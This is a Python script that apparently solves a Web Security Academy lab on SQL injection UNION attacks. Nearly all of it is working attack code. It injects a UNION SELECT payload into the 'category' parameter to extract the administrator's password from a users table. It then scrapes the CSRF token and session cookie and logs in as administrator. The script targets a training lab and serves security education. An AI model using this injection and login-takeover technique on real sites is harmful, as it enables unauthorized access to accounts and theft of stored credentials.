#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 21/9/2023
#
# Lab: SQL injection UNION attack, retrieving data from other tables
#
# Steps: 1. Inject payload into 'category' query parameter to retrieve administrator
#           password from users table
#        2. Fetch the login page
#        3. Extract csrf token and session cookie
#        4. Login as the administrator
#        5. Fetch the administrator profilele
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########
# change this to your lab URL
url = "https://0aea0080046a2eb588f5971100150069.web-security-academy.net"
print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")

try:
    # payload to retreive the password of the administrator
    payload = f"' union SELECT username, password from users where username = 'administrator'-- -"
    # fetch the page with the injected payload
    injection = requests.get(
        f"{url}/filter?category={payload}")
    # extract the administrator password
    admin_password = re.findall("<td>(.*)</td>",
                                injection.text)[0]
    print(Fore.WHITE + "1. Retrieving administrator password from users table.. " +
          Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)

    try:  # fetch login page
        fetch_login = requests.get(f"{url}/login")
        print(Fore.WHITE + "2. Fetching login page.. " + Fore.GREEN + "OK")
        # extract session cookie
        session = fetch_login.cookies.get("session")
        # extract csrf token
        csrf = re.findall("csrf.+value=\"(.+)\"",
                          fetch_login.content.decode())[0]
        print(
            Fore.WHITE + "3. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

        try:  # login in as the administrator
            data = {
                "username": "administrator",
                "password": admin_password,
                "csrf": csrf
            }
            cookies = {
                "session": session
            }
            login = requests.post(f"{url}/login", data,
                                  cookies=cookies, allow_redirects=False)
            print(
                Fore.WHITE + "4. Logging in as the administrator.. " + Fore.GREEN + "OK")
            # extract new session
            new_session = login.cookies.get("session")
            cookies = {
                "session": new_session
            }
            try:  # fetch the administrator profile
                admin = requests.get(
                    f"{url}/my-account", cookies=cookies)
                print(
                    Fore.WHITE + "5. Fetching the administrator profile.. " + Fore.GREEN + "OK")
                print(
                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
            except:
                print(
                    Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
        except:
            print(
                Fore.RED + "[!] Failed to login as the administrator through exception")
    except:
        print(
            Fore.RED + "[!] Failed to fetch login page through exception")
except:
    print(
        Fore.RED + "[!] Failed to inject the payload to retrieve the password of the administrator through exception")